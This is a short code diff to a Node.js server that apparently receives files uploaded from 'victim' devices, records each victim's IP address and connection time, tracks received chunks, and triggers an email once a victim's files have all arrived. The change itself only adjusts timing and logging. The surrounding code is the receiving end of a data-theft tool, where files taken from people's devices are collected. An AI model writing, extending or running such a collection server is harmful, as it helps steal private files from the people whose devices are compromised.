@@ -56,7 +56,7 @@ const connectedDevices = {};
 // Track received chunks
 const chunkTracker = new Map();
 
-// Function to check if all files are received
+// Function to check if all files are received and calculate time
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
@@ -71,8 +71,9 @@ async function checkAndSendEmail(victimId, victimFolder) {
     victimFiles[victimId] = files;
 
     // Calculate and store the time taken to receive all files
-    const timeTaken = new Date() - connectedDevices[victimId].connectionTime;
+    const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
     connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the time in ms
+    console.log(`Time to receive all files for ${victimId}: ${timeTaken / 1000} seconds`);
   }
 }
 
@@ -106,7 +107,7 @@ app.post('/upload', (req, res) => {
     if (!connectedDevices[victimId]) {
       connectedDevices[victimId] = {
         ip: ip,
-        connectionTime: new Date(),
+        connectionTime: Date.now(),  // Record connection time in milliseconds
         lastConnectionTime: new Date(),
         filesTransferred: 0,
         fileList: [],
